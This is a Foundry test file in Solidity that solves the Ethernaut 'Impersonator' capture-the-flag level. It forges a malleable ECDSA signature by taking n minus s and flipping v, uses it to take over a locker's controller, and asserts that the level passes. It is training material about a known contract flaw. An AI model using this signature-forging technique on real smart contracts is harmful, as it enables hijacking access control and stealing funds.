// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

import {Test, console} from "forge-std/Test.sol";
import {StdCheats} from "forge-std/StdCheats.sol";
import "../src/Impersonator/ImpersonatorFactory.sol";
import "../src/Ethernaut.sol";

contract ImpersonatorTest is StdCheats, Test {
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
    }

    function testImpersonatorHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ImpersonatorFactory impersonatorFactory = new ImpersonatorFactory();
        ethernaut.registerLevel(impersonatorFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(impersonatorFactory);
        Impersonator ethernautImpersonator = Impersonator(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        uint256 secp256k1_n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;
        bytes32 r = bytes32(uint256(11397568185806560130291530949248708355673262872727946990834312389557386886033));
        bytes32 s = bytes32(
            secp256k1_n - uint256(54405834204020870944342294544757609285398723182661749830189277079337680158706)
        );
        uint8 v = 28;
        ethernautImpersonator.lockers(0).changeController(v, r, s, address(0));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
